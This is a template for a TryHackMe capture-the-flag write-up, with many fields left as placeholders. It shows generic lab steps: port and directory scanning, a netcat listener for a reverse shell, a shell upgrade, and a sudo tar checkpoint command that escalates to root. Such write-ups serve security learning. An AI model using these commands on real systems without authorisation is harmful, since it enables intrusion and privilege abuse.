# TryHackMe: [Room Name] Write-Up

![Room Logo/Banner](Link-to-image-if-available)

## 📝 Room Info
* **Name:** [[Room Name](https://tryhackme.com)]
* **Difficulty:** [Easy / Medium / Hard]

---

## 🔍 1. Enumeration

### Port Scan (Nmap)
An initial port scan was performed to identify open ports and running services:

```bash
sudo nmap -sC -sV -oN nmap_initial.txt <TARGET_IP>
```

**Results:**
* **Port 22 (SSH):** [Version, e.g., OpenSSH 8.2p1]
* **Port 80 (HTTP):** [Version, e.g., Apache httpd 2.4.41]
* [Add other ports here...]

### Web Enumeration (Port 80)
Navigating to the target IP in the browser revealed a [standard landing page / company website / etc.].

A directory brute-force search using `gobuster` uncovered the following paths:
```bash
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirb/common.txt
```

* `/secret_admin_panel` (Status: 200)
* `/uploads` (Status: 403)

---

## 💥 2. Exploitation (Initial Access)

### Vulnerability
Inside the `/secret_admin_panel` directory, a [vulnerability, e.g., SQL Injection / outdated plugin / default credentials] was discovered.

### Gaining a Shell
By exploiting this vulnerability [briefly explain how, e.g., via an Exploit-DB script or CyberChef payload], a reverse shell was successfully established.

```bash
# Command used on Kali to listen for the incoming connection:
nc -lvnp 4444
```

### 👤 User Flag
After stabilizing the shell (`python3 -c 'import pty; pty.spawn("/bin/bash")'`), the user flag was located and read:

* **Path:** `/home/[username]/user.txt`
* **Flag:** `THM{REDACTED_USER_FLAG}`

---

## 🚀 3. Privilege Escalation

### Local Enumeration
Once inside the system, checking the current user's privileges revealed an interesting misconfiguration:

```bash
sudo -l
```

**Output:** The user is allowed to run `/usr/bin/tar` as `root` without a password.

### Root Exploit
Using [GTFOBins](https://github.io) as a reference, the following command was executed to leverage the `tar` binary and elevate privileges to `root`:

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

### 👑 Root Flag
With root access achieved, the final flag was retrieved:

* **Path:** `/root/root.txt`
* **Flag:** `THM{REDACTED_ROOT_FLAG}`

---

## 💡 Lessons Learned
* [What did you learn from this room? e.g., Always check for default credentials.]
* [Which tool or technique was key to solving this challenge?]
